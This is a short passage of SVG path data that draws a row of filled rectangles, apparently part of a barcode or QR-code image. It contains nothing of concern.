M0.0 81.951h14.341v2.049h-14.341z M16.39 81.951h2.049v2.049h-2.049z M20.488 81.951h4.098v2.049h-4.098z M34.829 81.951h2.049v2.049h-2.049z M38.927 81.951h8.195v2.049h-8.195z M49.171 81.951h2.049v2.049h-2.049z M59.415 81.951h2.049v2.049h-2.049z M63.512 81.951h12.293v2.049h-12.293z M77.854 81.951h4.098v2.049h-4.098z"/>
